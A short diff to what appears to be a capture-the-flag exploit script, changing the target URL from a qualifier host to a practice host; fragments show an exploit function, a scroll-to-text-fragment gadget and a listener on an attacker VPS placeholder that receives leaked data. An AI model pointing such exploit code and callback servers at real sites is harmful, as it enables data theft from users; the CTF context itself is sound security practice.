@@ -120,7 +120,7 @@ def STTF_Gadget(client: httpx.Client, username: str, REPORT_SERVER_URL: str, ORA
             break
 
 def exploit():
-    BASE_URL = "http://doomer.quals.scc2025.ctf.rs:1337"
+    BASE_URL = "http://doomer.playground.cyberhero.rs:1337"
     ORACLE_SERVER_URL = "http://<VPS_IP>:9999"
     REPORT_SERVER_URL = "http://web:1337"
 
@@ -179,4 +179,3 @@ def poll():
 if __name__ == "__main__":
     app.run(host='0.0.0.0', port=9999, debug=True)
 ```
-
